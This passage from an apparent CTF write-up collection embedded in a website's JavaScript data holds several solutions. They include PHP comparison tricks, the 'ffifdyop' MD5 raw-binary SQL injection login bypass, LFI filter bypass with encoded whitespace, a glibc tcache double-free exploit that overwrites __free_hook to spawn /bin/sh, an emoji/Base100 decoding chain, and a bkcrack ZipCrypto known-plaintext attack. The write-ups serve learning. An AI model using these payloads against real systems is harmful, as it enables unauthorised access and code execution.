**\u539F\u7406**: WAF \u4F7F\u7528\u5B57\u7B26\u4E32\u5339\u914D\u68C0\u6D4B \`/flag\`\uFF0C\u4F46 \`%09\`\uFF08TAB \u5B57\u7B26\uFF09\u88AB PHP \u5F53\u4F5C\u7A7A\u767D\u7B26\uFF0C\u6253\u65AD\u4E86\u8FDE\u7EED\u5B57\u7B26\u4E32\u5339\u914D\u3002

**Flag**: \`flag{...}\`

---

## web_test_9 (790) - PHP \u53CD\u5E8F\u5217\u5316 NULL vs FALSE

**\u5206\u503C**: 454 | **\u7C7B\u578B**: Web

**\u89E3\u9898\u601D\u8DEF**: PHP \u5F31\u7C7B\u578B\u6BD4\u8F83\u6F0F\u6D1E\u3002

**\u5173\u952E\u6B65\u9AA4**:
1. \u53D1\u73B0\u53CD\u5E8F\u5217\u5316\u5165\u53E3\uFF0C\u9700\u8981\u6784\u9020\u7279\u5B9A\u5BF9\u8C61
2. \u5229\u7528 \`NULL !== FALSE\` \u4F46 \`md5(NULL) === md5(FALSE)\` \u7684\u7279\u6027
3. \u6784\u9020 payload \u7ED5\u8FC7\u4E25\u683C\u6BD4\u8F83

**Payload**:
\`\`\`php
$a = NULL;
$b = FALSE;
// $a !== $b \u4E3A true
// md5($a) === md5($b) \u4E3A true\uFF08\u90FD\u662F md5("") = "d41d8cd98f00b204e9800998ecf8427e"\uFF09
\`\`\`

**Flag**: \`flag{...}\`

---

## web_test_10 (791) - PHP \u53CD\u5E8F\u5217\u5316 NAN Filter

**\u5206\u503C**: 454 | **\u7C7B\u578B**: Web

**\u89E3\u9898\u601D\u8DEF**: \u5728 790 \u57FA\u7840\u4E0A\u589E\u52A0 NAN \u8FC7\u6EE4\u3002

**\u5173\u952E\u6B65\u9AA4**:
1. \u4E0E 790 \u7C7B\u4F3C\u7684\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E
2. \u589E\u52A0\u4E86 \`stripos($input, "NAN")\` \u68C0\u67E5
3. NULL \u548C FALSE \u90FD\u4E0D\u542B "NAN" \u5B57\u7B26\u4E32\uFF0C\u7ED5\u8FC7\u68C0\u67E5

**Payload**:
\`\`\`php
$a = NULL;  // \u4E0D\u542B "NAN"
$b = FALSE; // \u4E0D\u542B "NAN"
\`\`\`

**Flag**: \`flag{...}\`

---

## web_test_11 (792) - MD5 Raw Binary SQL Injection

**\u5206\u503C**: 454 | **\u7C7B\u578B**: Web

**\u89E3\u9898\u601D\u8DEF**: \u5229\u7528 MD5 \u539F\u59CB\u4E8C\u8FDB\u5236\u8F93\u51FA\u8FDB\u884C SQL \u6CE8\u5165\u3002

**\u5173\u952E\u6B65\u9AA4**:
1. \u53D1\u73B0\u767B\u5F55\u63A5\u53E3\u4F7F\u7528 \`md5($password, true)\` \u8FDB\u884C\u6BD4\u8F83
2. \u5BC6\u7801 "ffifdyop" \u7684 MD5 \u539F\u59CB\u4E8C\u8FDB\u5236\u5305\u542B \`'or'\` \u5B57\u7B26\u4E32
3. \u6CE8\u5165\u540E SQL \u8BED\u53E5\u53D8\u4E3A \`WHERE password = ''or'...'\`\uFF0C\u7ED5\u8FC7\u9A8C\u8BC1

**Payload**:
\`\`\`
password = ffifdyop
\`\`\`

**\u539F\u7406**: \`md5("ffifdyop", true)\` \u8FD4\u56DE\u7684\u539F\u59CB\u4E8C\u8FDB\u5236\u4E2D\u5305\u542B \`'or'6\`\uFF0C\u62FC\u63A5\u540E SQL \u53D8\u4E3A\uFF1A
\`\`\`sql
SELECT * FROM users WHERE password = ''or'6....'
\`\`\`

**Flag**: \`flag{...}\`

---

## \u6280\u5DE7\u603B\u7ED3

### 1. \u53CD\u5E8F\u5217\u5316\u6280\u5DE7
- \`NULL !== FALSE\` \u4F46 \`md5(NULL) === md5(FALSE)\`
- \`md5($input, true)\` \u8FD4\u56DE\u539F\u59CB\u4E8C\u8FDB\u5236\uFF0C\u53EF\u80FD\u5305\u542B SQL \u6CE8\u5165\u5B57\u7B26\u4E32
- \u5BC6\u7801 "ffifdyop" \u662F\u7ECF\u5178\u7684 MD5 raw binary SQLi payload

### 2. \u7ADE\u6001\u6761\u4EF6
- \u4F7F\u7528 \`concurrent.futures.ThreadPoolExecutor\` \u5E76\u53D1\u8BF7\u6C42
- \u68C0\u67E5\u4E0E\u64CD\u4F5C\u4E4B\u95F4\u7684\u65F6\u95F4\u7A97\u53E3\u662F\u5173\u952E

### 3. LFI Filter Bypass
- \`%09\`\uFF08TAB\uFF09\u3001\`%0A\`\uFF08\u6362\u884C\uFF09\u3001\`%0D\`\uFF08\u56DE\u8F66\uFF09\u53EF\u6253\u65AD\u5B57\u7B26\u4E32\u5339\u914D
- \u53CC\u7F16\u7801\u3001Unicode \u7F16\u7801\u4E5F\u53EF\u80FD\u7ED5\u8FC7\u8FC7\u6EE4

### 4. \u53D8\u91CF\u8986\u76D6
- \`extract()\` \u51FD\u6570\u53EF\u8986\u76D6\u5DF2\u6709\u53D8\u91CF
- \`$$\` \u53EF\u53D8\u53D8\u91CF\u53EF\u52A8\u6001\u521B\u5EFA\u53D8\u91CF

---

*WriteUp \u751F\u6210\u65F6\u95F4: 2026-06-16*
*\u4F5C\u8005: heliumsenbrg*
`
  },
  gift: {
    title: "Gift - Tcache Double-Free",
    subtitle: "UAF + Unsorted Bin Leak + Tcache Poisoning",
    content: `
# Gift - Tcache Double-Free PWN

**Platform**: qingcen CTF (docker.qingcen.net)
**Type**: PWN / Heap Exploitation
**Difficulty**: Hard (476 points, 2 solvers)

## Binary Protections

\`\`\`
RELRO:   Full RELRO
Stack:   Canary found
NX:      NX enabled
PIE:     PIE enabled
CET:     SHSTK + IBT enabled
Libc:    glibc 2.31 (Ubuntu 20.04)
\`\`\`

Full RELRO prevents GOT overwrite. CET (SHSTK+IBT) makes ROP difficult.
The attack must go through libc hooks like __free_hook.

## Vulnerability: Hidden Gift Function

The binary is a note manager with 3 visible options: Add, Show, Release.
A hidden option 4 ("A gift for you") calls free(chunk) but does NOT null out ptrs[idx] or sizes[idx], creating a dangling pointer (UAF).

Normal release() properly nulls both ptrs[idx] and sizes[idx].

\`\`\`c
// Gift function (pseudo-code)
void gift() {
    if (gift_used) return;  // one-time use!
    gift_used = 1;
    int idx = read_index();
    if (ptrs[idx] != NULL)
        free(ptrs[idx]);  // BUG: ptrs[idx] NOT cleared!
}
\`\`\`

## Key Insight: Double-Free via gift + release

Since gift() does not clear ptrs[idx], calling release() on the same index afterward triggers free() on the already-freed chunk:

1. gift(idx): free(A), ptrs[idx] still = A (dangling)
2. release(idx): free(ptrs[idx]) = free(A) again! -> DOUBLE FREE

glibc 2.31 tcache has no double-free detection, creating a cycle: A -> A -> A -> ...

## Exploitation Strategy

### Phase 1: Libc Leak via Unsorted Bin

Fill tcache (7 entries), then gift(0) pushes chunk to unsorted bin.
show(0) reads the freed chunk fd pointer = &main_arena+104 (libc address).

\`\`\`python
# Fill tcache bin 16 (size 0x110) with 7 entries
for i in range(8, 1, -1):
    release(i)  # 7 frees -> tcache full

# gift(0): tcache full -> chunk goes to unsorted bin
gift(0)

# Leak libc from unsorted bin fd pointer
leak = u64(show(0)[:8])
libc_base = leak - (malloc_hook + 0x78)
\`\`\`

### Phase 2: Double-Free -> Tcache Cycle

\`\`\`python
# release(0) frees the same chunk again -> double-free!
release(0)
# tcache cycle: A -> A -> A -> ...
\`\`\`

### Phase 3: Tcache Poisoning -> __free_hook

Three allocations from the cycled tcache:

\`\`\`python
# Alloc #1: get A, write __free_hook as fd
add(2, 0xf8, p64(free_hook))

# Alloc #2: get A again (cycle), tcache reads *A = free_hook as next
add(3, 0xf8, p64(system))

# Alloc #3: get __free_hook! Write system
add(4, 0xf8, p64(system))
\`\`\`

### Phase 4: Trigger Shell

\`\`\`python
add(5, 0xf8, b'/bin/sh\\x00')
release(5)  # free(chunk) -> __free_hook -> system("/bin/sh")
\`\`\`

## Key Takeaways

1. gift() + release() = double-free, even with one-time gift
2. Unsorted bin fd between gift and release leaks libc cleanly
3. Tcache cycle A->A lets you allocate the same chunk multiple times
4. __free_hook is the go-to target when Full RELRO + CET are enabled
`
  },
  "moectf-emoji": {
    title: "MoeCTF ez_base_revenge9 \u2014 Emoji \u7F16\u7801",
    subtitle: "Base100 \u2192 Base64 \u2192 Base58 \u2192 Base32",
    content: `
# MoeCTF ez_base_revenge9 \u2014 Emoji \u7F16\u7801 (Base100)

**Platform**: MoeCTF
**Type**: Misc / Encoding
**Difficulty**: Easy
**Flag**: \`moectf{3m0j!_15_50_cu73_2333333}\`

## \u9898\u76EE

\u9644\u4EF6\u89E3\u538B\u51FA \`flag9.txt\`\uFF0C\u91CC\u9762\u4E00\u4E2A\u6B63\u7ECF\u5B57\u90FD\u6CA1\u6709\uFF0C\u53EA\u6709 104 \u4E2A emoji\uFF1A

\`\`\`text
\u{1F42D}\u{1F429}\u{1F427}\u{1F429}\u{1F42D}\u{1F42D}\u{1F401}\u{1F42D}\u{1F429}\u{1F401}\u{1F42D}\u{1F429}\u{1F401}\u{1F401}\u{1F429}\u{1F42D}\u{1F401}\u{1F429}\u{1F429}\u{1F42D}\u{1F42D}\u{1F429}\u{1F427}\u{1F429}\u{1F401}\u{1F42D}\u{1F428}\u{1F429}\u{1F427}\u{1F428}\u{1F42D}\u{1F429}\u{1F427}\u{1F428}\u{1F42D}\u{1F429}\u{1F428}\u{1F427}\u{1F42D}\u{1F429}...
\`\`\`

416 \u5B57\u8282\uFF0C\u65E0\u6362\u884C\u3002

## \u9898\u76EE\u5206\u6790

\u5148\u522B\u6025\u7740\u731C\u7F16\u7801\uFF0C\u628A\u5B57\u8282\u6252\u5F00\u770B\uFF1A

- 416 / 4 = 104 \u4E2A\u5B57\u7B26\uFF0C\u5168\u662F 4 \u5B57\u8282 UTF-8
- \u9996\u5B57\u8282\u6052\u4E3A \`F0\`\uFF0C\u6B21\u5B57\u8282\u6052\u4E3A \`9F\`
- \u7B2C\u4E09\u5B57\u8282\u53EA\u5728 \`90\` / \`91\` \u4E4B\u95F4\u8DF3
- \u7801\u70B9\u5168\u90E8\u843D\u5728 \`U+1F400 \u2013 U+1F47F\`\uFF0C\u6B63\u597D 128 \u4E2A\u53EF\u9009\u503C

\u8FD9\u5C31\u662F **Base100**\uFF08Emoji Encoding\uFF09\u3002\u5B83\u7684\u89C4\u5219\u4E0D\u662F\u300C\u7801\u70B9\u51CF\u504F\u79FB\u300D\uFF0C\u800C\u662F\u628A 1 \u4E2A\u5B57\u8282\u62C6\u6210 6 + 6 \u4F4D\uFF0C\u585E\u8FDB UTF-8 \u7684\u6700\u540E\u4E24\u4E2A\u5B57\u8282\uFF1A

\`\`\`text
UTF-8:  F0 9F b3 b4
        b3 = (byte + 55) / 64 + 143
        b4 = (byte + 55) % 64 + 128
\`\`\`

\u6240\u4EE5\u89E3\u7801\uFF1A

\`\`\`python
byte = (b3 - 143) * 64 + (b4 - 128) - 55
\`\`\`

### \u6700\u5927\u7684\u5751

\u6211\u7B2C\u4E00\u53CD\u5E94\u662F\u6309\u7801\u70B9\u7B97 \`codepoint - 0x1F400\`\uFF0C\u7ED3\u679C\u62FF\u5230\u4E00\u4E32\u8303\u56F4 40\u2013113 \u7684\u4E71\u7801\uFF0C\u957F\u5F97\u7279\u522B\u50CF base85 / base91 / base92\uFF0C\u7136\u540E\u5C31\u5728\u9519\u8BEF\u7684\u65B9\u5411\u4E0A\u4E00\u8DEF\u72C2\u5954 \u2014\u2014 b92\u3001b94\u3001b128 \u5168\u8BD5\u4E86\u4E00\u904D\uFF0C\u5168\u662F\u566A\u58F0\u3002

**\u6B63\u786E\u504F\u79FB\u662F +9\uFF0C\u800C\u4E14\u5FC5\u987B\u8D70\u300C6 + 6 \u4F4D\u62FC\u63A5\u300D\u8FD9\u6761\u8DEF\u3002** \u770B\u5230 emoji \u5148 hexdump\uFF0C\u6BD4\u8089\u773C\u731C\u9760\u8C31\u5F97\u591A\u3002

## \u89E3\u9898\u6B65\u9AA4

### Step 1 \u2014 Base100 \u89E3\u7801

\`\`\`python
def b100_decode(s):
    out = bytearray()
    for ch in s:
        b = ch.encode('utf-8')
        out.append((b[2] - 143) * 64 + (b[3] - 128) - 55)
    return bytes(out)

emoji = open('flag9.txt', encoding='utf-8').read().strip()
print(b100_decode(emoji).decode())
\`\`\`

\u8F93\u51FA 104 \u5B57\u8282\u7EAF\u53EF\u6253\u5370 ASCII\uFF0C\u5E76\u4E14\u4EE5 \`=\` \u7ED3\u5C3E \u2014\u2014 Base64 \u5B9E\u9524\u3002

### Step 2 \u2014 \u94FE\u5F0F\u5265\u79BB

\u4E00\u5C42\u5C42\u5265\uFF0C\u6BCF\u5C42\u7528\u300C\u7ED3\u679C\u662F\u5426 100% \u53EF\u6253\u5370 ASCII\u300D\u5224\u65AD\u662F\u5426\u5265\u5BF9\uFF1A

\`\`\`python
import base64

B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'

def b58decode(s):
    v = 0
    for c in s:
        v = v * 58 + B58.index(c)
    return v.to_bytes((v.bit_length() + 7) // 8, 'big')

DECS = [
    ('b64', base64.b64decode),
    ('b32', base64.b32decode),
    ('b16', base64.b16decode),
    ('b85', base64.b85decode),
    ('a85', base64.a85decode),
    ('b58', b58decode),
]

cur = b100_decode(emoji).decode()
while True:
    for name, fn in DECS:
        try:
            r = fn(cur)
            if r and len(r) >= 4 and all(32 <= x < 127 for x in r):
                print(f'[{name}] -> {r.decode()}')
                cur = r.decode()
                break
        except Exception:
            pass
    else:
        break
print('FLAG:', cur)
\`\`\`

### \u5B8C\u6574\u94FE\u8DEF

\`\`\`text
[base100] MzgzZk1mVnc4dXBtbWJ3ejRvTFhWREJVQlVYakdnSnlRNDZmQ1FyRjMxQUVuS2NUR2FBbW5nTW5oZ3NSNlVtdkFkQnZHNm9KVjRFakU=
[b64]     383fMfVw8upmmbwz4oLXVDBUBUXjGgJyQ46fCQrF31AEnKcTGaAmngMnhgsR6UmvAdBvG6oJV4EjE
[b58]     NVXWKY3UMZ5TG3JQNIQV6MJVL42TAX3DOU3TGXZSGMZTGMZTGN6Q====
[b32]     moectf{3m0j!_15_50_cu73_2333333}
\`\`\`

| \u5C42 | \u7F16\u7801 | \u8BC6\u522B\u7279\u5F81 |
|----|------|----------|
| 1 | Base100 (Emoji) | 4 \u5B57\u8282 UTF-8\uFF0C\u7B2C\u4E09\u5B57\u8282\u53EA\u5728 \`90\` / \`91\` |
| 2 | Base64 | \u4EE5 \`=\` \u8865\u9F50\u7ED3\u5C3E |
| 3 | Base58 | \u5168\u4E32\u4E0D\u542B \`0\` \`O\` \`I\` \`l\` |
| 4 | Base32 | \u53EA\u6709 \`A\u2013Z\` \u4E0E \`2\u20137\`\uFF0C\u957F\u5EA6\u662F 8 \u7684\u500D\u6570 |

## Flag

\`\`\`text
moectf{3m0j!_15_50_cu73_2333333}
\`\`\`

## \u77E5\u8BC6\u70B9

- **Base100**\uFF1A1 emoji = 1 byte\uFF0C\u7F16\u7801\u8868\u4ECE \`U+1F400\` \u8D77\u5171 128 \u4E2A emoji\uFF0C\`(byte + 55)\` \u62C6\u6210 6 + 6 \u4F4D\u585E\u8FDB UTF-8 \u5C3E\u5B57\u8282
- **\u94FE\u5F0F\u5265\u79BB\u7684\u901A\u7528\u5957\u8DEF**\uFF1A\u6BCF\u5265\u4E00\u5C42\u5C31\u68C0\u67E5\u300C\u662F\u5426 100% \u53EF\u6253\u5370 ASCII \u4E14\u957F\u5EA6 \u2265 4\u300D\uFF0C\u662F\u5219\u7EE7\u7EED\u5265\uFF0C\u5426\u5219\u6362\u4E0B\u4E00\u4E2A\u89E3\u7801\u5668
- **Base58 \u7684\u6307\u7EB9**\uFF1A\u5B57\u7B26\u96C6\u628A \`0\`\uFF08\u96F6\uFF09\u3001\`O\`\uFF08\u5927\u5199 o\uFF09\u3001\`I\`\uFF08\u5927\u5199 i\uFF09\u3001\`l\`\uFF08\u5C0F\u5199 L\uFF09\u5168\u5254\u4E86\uFF0C\u6240\u4EE5\u8FD9 4 \u4E2A\u5B57\u7B26\u4E00\u6B21\u90FD\u4E0D\u4F1A\u51FA\u73B0
- **Base32 \u7684\u6307\u7EB9**\uFF1A\u5B57\u6BCD\u8868\u53EA\u6709 \`A\u2013Z\` \u52A0 \`2\u20137\`\uFF0C\u957F\u5EA6\u662F 8 \u7684\u500D\u6570\uFF0C\`=\` \u8865\u9F50
`
  },
  "moectf-zipcrypto": {
    title: "ZIP \u5DF2\u77E5\u660E\u6587\u653B\u51FB (bkcrack)",
    subtitle: "\u63D0\u793A\u8BED\u5373\u660E\u6587 + ZipCrypto",
    content: `
# ZIP \u5DF2\u77E5\u660E\u6587\u653B\u51FB (bkcrack) \u2014 \u5F53\u63D0\u793A\u8BED\u5C31\u662F\u660E\u6587

**Platform**: MoeCTF
**Type**: Misc / Crypto
**Difficulty**: Medium
**Flag**: \`moectf{1t_i5_So0o0o0o_Obv1ou5}\`

## \u9898\u76EE

\u6CA1\u6709\u6E90\u7801\u3001\u6CA1\u6709\u9776\u673A\uFF0C\u53EA\u6709\u4E00\u53E5\u63D0\u793A\u548C\u4E00\u4EFD\u9644\u4EF6\uFF1A

> \u6709\u65F6\u5019\uFF0C\u4E00\u7EBF\u751F\u673A\u5F80\u5F80\u85CF\u5728\u6700\u660E\u663E\u7684\u5730\u65B9

\u5916\u52A0\u4E00\u4E2A 388 \u5B57\u8282\u7684 \`flag.zip\`\u3002

## \u9898\u76EE\u5206\u6790

\u5148\u522B\u6025\u7740\u4E0A rockyou\uFF0C\u628A ZIP \u7ED3\u6784\u6252\u5F00\uFF1A

\`\`\`python
import struct

d = open('flag.zip', 'rb').read()
eocd = d.rfind(b'PK\\x05\\x06')
n   = struct.unpack('<H', d[eocd+10:eocd+12])[0]
off = struct.unpack('<I', d[eocd+16:eocd+20])[0]

for _ in range(n):
    flag, comp, _, _, crc, csz, usz, nl, el, cl, _, _, _, lho = \\
        struct.unpack('<IHHHHIIIHHHHHII', d[off:off+46])
    name = d[off+46:off+46+nl].decode()
    print(f'{name}: flags=0x{flag:04x} comp={comp} crc=0x{crc:08x} csize={csz} usize={usz}')
    off += 46 + nl + el + cl
\`\`\`

\u8F93\u51FA\uFF1A

\`\`\`text
flag.txt : flags=0x0009 comp=0 crc=0xb5e4f14f csize=42 usize=30
README.md: flags=0x0009 comp=0 crc=0xb159483a csize=66 usize=54
\`\`\`

\u4E09\u4E2A\u7ED3\u8BBA\uFF1A

1. \`flags & 1\` \u7F6E\u4F4D \u2192 \u6761\u76EE\u88AB\u6807\u8BB0\u4E3A\u52A0\u5BC6
2. \`comp=0\`\uFF08Stored\uFF09\u4E14 \`csize == usize + 12\` \u2192 \u591A\u51FA\u7684 12 \u5B57\u8282\u662F ZipCrypto \u52A0\u5BC6\u5934\uFF0C\u8BF4\u660E\u662F**\u771F\u52A0\u5BC6**
3. \u5305\u91CC\u9664\u4E86 flag \u8FD8\u6709\u4E2A **README.md** \u2014\u2014 \u8FD9\u901A\u5E38\u662F\u51FA\u9898\u4EBA\u7684\u63D0\u793A\u6587\u4EF6

> \u8865\u4E00\u53E5\uFF1A\`csize == usize\` \u624D\u53EF\u80FD\u662F**\u4F2A\u52A0\u5BC6**\uFF0C\u628A local + central header \u7684 bit 0 \u6E05\u6389\u5C31\u80FD\u76F4\u63A5\u89E3\u538B\u3002\u672C\u9898\u4E0D\u662F\u3002

## \u7834\u9898\u70B9\uFF1A\u63D0\u793A\u8BED\u5C31\u662F\u660E\u6587

\u300C\u6700\u660E\u663E\u7684\u5730\u65B9\u300D\u2014\u2014 \u63D0\u793A\u8BED\u672C\u8EAB\u3002\u65E2\u7136\u540C\u5305\u91CC\u6709\u4E2A README.md\uFF0C\u5B83\u7684\u5185\u5BB9\u5F88\u53EF\u80FD\u5C31\u662F\u8FD9\u53E5\u63D0\u793A\u539F\u6587\u3002

\u800C\u4E14 ZIP \u5934\u90E8\u5B58\u7684\u662F**\u660E\u6587**\u7684 CRC32\uFF0C\u4E0D\u7528\u89E3\u5BC6\u5C31\u80FD\u9A8C\u8BC1\u731C\u60F3\uFF1A

\`\`\`python
import zlib
target = 0xb159483a          # README.md \u5934\u90E8\u7684 CRC
s = '\u6709\u65F6\u5019\uFF0C\u4E00\u7EBF\u751F\u673A\u5F80\u5F80\u85CF\u5728\u6700\u660E\u663E\u7684\u5730\u65B9'
print(hex(zlib.crc32(s.encode('utf-8')) & 0xffffffff))
# 0xb159483a  \u2705 \u547D\u4E2D
\`\`\`

\u5B57\u8282\u6570\u4E5F\u5BF9\u5F97\u4E0A\uFF1A18 \u4E2A\u6C49\u5B57 \xD7 3 \u5B57\u8282 UTF-8 = 54 \u5B57\u8282 = \`usize\`\u3002**\u5DF2\u77E5\u660E\u6587\u5230\u624B\u3002**

\u6CE8\u610F\u522B\u52A0\u5C3E\u968F\u6362\u884C\uFF0C\`usize=54\` \u6B63\u597D\u5361\u6B7B\u957F\u5EA6\u3002

## \u89E3\u9898\u6B65\u9AA4

### Step 1 \u2014 \u5BFC\u51FA\u5DF2\u77E5\u660E\u6587

\`\`\`bash
python -c "open('known.bin','wb').write('\u6709\u65F6\u5019\uFF0C\u4E00\u7EBF\u751F\u673A\u5F80\u5F80\u85CF\u5728\u6700\u660E\u663E\u7684\u5730\u65B9'.encode('utf-8'))"
\`\`\`

### Step 2 \u2014 bkcrack \u6062\u590D\u5185\u90E8\u5BC6\u94A5

bkcrack \u81F3\u5C11\u9700\u8981 12 \u5B57\u8282\u5DF2\u77E5\u660E\u6587\uFF0C\u6211\u4EEC\u6709 54 \u5B57\u8282\uFF0C\u7EF0\u7EF0\u6709\u4F59\uFF1A

\`\`\`bash
bkcrack -C flag.zip -c README.md -p known.bin
\`\`\`

\u8DD1\u7EA6 3 \u5206\u949F\uFF0C\u62FF\u5230\u4E09\u4E2A 32 \u4F4D\u5185\u90E8\u5BC6\u94A5\uFF1A

\`\`\`text
80.3 % (135290 / 168584)
Found a solution. Stopping.

[23:38:08] Keys
39cd809b 10a0fcb2 669a68f7
\`\`\`

### Step 3 \u2014 \u7528\u5BC6\u94A5\u76F4\u63A5\u6539\u5BC6\u7801

\u62FF\u5230\u5185\u90E8\u5BC6\u94A5\u540E\u5C31**\u4E0D\u5FC5\u8FD8\u539F\u539F\u59CB\u53E3\u4EE4**\u4E86 \u2014\u2014 ZipCrypto \u7684 \`update_keys\` \u662F\u5B8C\u5168\u53EF\u9006\u7684\uFF0Cbkcrack \u53EF\u4EE5\u628A\u5BC6\u6587\u300C\u91CD\u6253\u5305\u300D\u6210\u4EFB\u610F\u65B0\u5BC6\u7801\uFF1A

\`\`\`bash
bkcrack -C flag.zip -k 39cd809b 10a0fcb2 669a68f7 -U unlocked.zip 123456
\`\`\`

### Step 4 \u2014 \u89E3\u538B

\`\`\`bash
unzip -P 123456 unlocked.zip
\`\`\`

\`\`\`text
flag.txt : moectf{1t_i5_So0o0o0o_Obv1ou5}
README.md: \u6709\u65F6\u5019\uFF0C\u4E00\u7EBF\u751F\u673A\u5F80\u5F80\u85CF\u5728\u6700\u660E\u663E\u7684\u5730\u65B9
\`\`\`

### Step 5 \u2014 \u6821\u9A8C

\u7528\u5934\u90E8 CRC \u590D\u6838\uFF0C\u786E\u8BA4\u4E0D\u662F\u5DE7\u5408\uFF1A

\`\`\`python
zlib.crc32(open('flag.txt','rb').read())  & 0xffffffff   # 0xb5e4f14f \u2705
zlib.crc32(open('README.md','rb').read()) & 0xffffffff   # 0xb159483a \u2705
\`\`\`

## Flag

\`\`\`text
moectf{1t_i5_So0o0o0o_Obv1ou5}
\`\`\`

## \u77E5\u8BC6\u70B9

| \u5224\u636E | \u542B\u4E49 |
|------|------|
| \`flags & 1\` | \u53EA\u662F\u300C\u6807\u8BB0\u4E3A\u52A0\u5BC6\u300D\uFF0C\u4E0D\u4EE3\u8868\u771F\u52A0\u5BC6 |
| \`csize == usize + 12\` | \u771F ZipCrypto\uFF0812 \u5B57\u8282\u52A0\u5BC6\u5934\uFF09 |
| \`csize == usize\` | \u4F2A\u52A0\u5BC6\uFF0C\u6E05\u6389 header bit 0 \u5373\u53EF\u89E3\u538B |
| \u5934\u90E8 CRC32 | **\u660E\u6587**\u7684 CRC\uFF0C\u53EF\u79D2\u7EA7\u9A8C\u8BC1\u660E\u6587\u731C\u60F3 |

- **bkcrack**\uFF08Biham\u2013Kocher \u5DF2\u77E5\u660E\u6587\u653B\u51FB\uFF09\uFF1A\u53EA\u8981 12 \u5B57\u8282\u5DF2\u77E5\u660E\u6587\u5C31\u80FD\u6062\u590D ZipCrypto \u7684\u4E09\u4E2A\u5185\u90E8\u5BC6\u94A5
- \u6709\u4E86\u5185\u90E8\u5BC6\u94A5\u5C31\u4E0D\u5FC5\u8FD8\u539F\u53E3\u4EE4\uFF1A\`-U out.zip newpass\` \u76F4\u63A5\u91CD\u6253\u5305
- ZIP \u5934\u91CC\u8FD8\u6709\u4E2A **check byte**\uFF1A\u52A0\u5BC6\u5934\u7B2C 12 \u5B57\u8282\u901A\u5E38\u662F \`(crc >> 24) & 0xff\`\uFF08flags bit 3 \u7F6E\u4F4D\u65F6\uFF09\u6216 \`(dostime >> 8) & 0xff\`\uFF0C\u672C\u6765\u53EF\u4EE5\u7528\u6765\u5FEB\u901F\u7B5B\u53E3\u4EE4

## \u8E29\u5751

1. **\u4E00\u5F00\u59CB\u60F3\u7206\u7834\u5F31\u53E3\u4EE4**\uFF1A\u5199\u4E86 50 \u4E2A\u5019\u9009\u53E3\u4EE4\u5168\u6302\u3002\u800C\u4E14\u672C\u9898\u751F\u6210\u5668\u5199\u7684\u662F\u968F\u673A check byte\uFF08\`hdr[11] = 0x6e\`\uFF0C\u800C \`crc>>24 = 0xb5\`\u3001\`time>>8 = 0x8a\` \u90FD\u5BF9\u4E0D\u4E0A\uFF09\uFF0C\u8FDE\u300C\u5FEB\u901F\u7B5B\u300D\u8FD9\u6761\u8DEF\u90FD\u65AD\u4E86
2. **bkcrack \u7684\u8FDB\u5EA6\u7528 \`\\r\` \u5237\u5C4F**\uFF1A\u76F4\u63A5\u8DD1\u4F1A\u6DF9\u6CA1\u7BA1\u9053\u3001\u88AB\u5224\u5B9A\u4E3A\u5361\u6B7B\u3002\u8981 \`> bk.log 2>&1\` \u91CD\u5B9A\u5411\u5230\u65E5\u5FD7\u6587\u4EF6\u540E\u53F0\u8DD1\uFF0C\u518D\u7528 \`tr '\\r' '\\n' < bk.log\` \u770B\u7ED3\u679C
3. **\u4E0B\u8F7D bkcrack \u522B\u7167\u6284\u65E7\u7248\u672C\u53F7**\uFF1Av1.7.0 \u7684 release URL \u5DF2\u7ECF 404\uFF0C\u7528 GitHub API \`repos/kimci86/bkcrack/releases/latest\` \u62FF\u6700\u65B0\u7248\u672C\u53F7\uFF08\u5199\u8FD9\u7BC7\u65F6\u662F v1.8.1\uFF09
4. **Python \u81EA\u5E26 \`zipfile\` \u7684 ZipCrypto \u662F\u7EAF Python \u5B9E\u73B0**\uFF0C\u6BD4 bkcrack \u6162\u51E0\u5341\u500D\uFF0C\u522B\u62FF\u5B83\u7206\u7834
`
  }
};

// src/data/kb/index.js
var kb_default = {
  "generatedAt": "2026-10-05T11:42:50.930Z",
  "vault": "C:\\Users\\hwh\\Desktop\\\u77E5\u8BC6\u5E93\\hsb\u7684\u7B2C\u4E8C\u5927\u8111\\02-\u7B14\u8BB0",
  "total": 69,
  "sections": [
    {
      "id": "concept",
      "title": "\u6982\u5FF5",
      "groups": [
        {
          "id": "web",
          "title": "Web",
          "notes": [
            {
              "name": "Web-\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E",
              "title": "Web-\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E",
              "summary": '\u7A0B\u5E8F\u628A"\u5B57\u8282\u6D41\u8FD8\u539F\u6210\u5BF9\u8C61"\u7684\u8FC7\u7A0B\u7ED9\u4E86\u653B\u51FB\u8005\u63A7\u5236\u6743\u2014\u2014\u5173\u952E\u5728\u4E8E**\u80FD\u4E0D\u80FD\u63A7\u5236\u88AB\u8FD8\u539F\u7684\u7C7B\u3001\u4EE5\u53CA\u8FD8\u539F\u65F6\u81EA\u52A8\u8C03\u7528\u4E86\u4EC0\u4E48\u65B9\u6CD5**\u3002'
            },
            {
              "name": "Web-\u7ADE\u6001\u6761\u4EF6\u653B\u51FB",
              "title": "Web-\u7ADE\u6001\u6761\u4EF6\u653B\u51FB",
              "summary": '\u540C\u4E00\u4EF6\u4E8B\u88AB"\u540C\u65F6"\u505A\u4E86\u4E24\u6B21\uFF1A**\u68C0\u67E5\uFF08check\uFF09\u548C\u4F7F\u7528\uFF08use\uFF09\u4E4B\u95F4\u6709\u4E00\u4E2A\u5C0F\u7A97\u53E3**\uFF0C\u5E76\u53D1\u8BF7\u6C42\u53EF\u4EE5\u6324\u8FDB\u8FD9\u4E2A\u7A97\u53E3\uFF0C\u8BA9\u6240\u6709\u8BF7\u6C42\u90FD\u76F8\u4FE1"\u8FD8\u6CA1\u505A\u8FC7"\u3002CTF \u91CC\u5B83\u4E13\u6CBB\u79EF\u5206\u3001\u4F59\u989D\u3001\u4F18\u60E0\u5238\u3001\u4E00\u6B21\u6027\u4EE4\u724C\u3002'
            },
            {
              "name": "Web-\u5BA2\u6237\u7AEF\u653B\u51FB\u4E0E\u524D\u7AEF\u5B89\u5168",
              "title": "Web-\u5BA2\u6237\u7AEF\u653B\u51FB\u4E0E\u524D\u7AEF\u5B89\u5168",
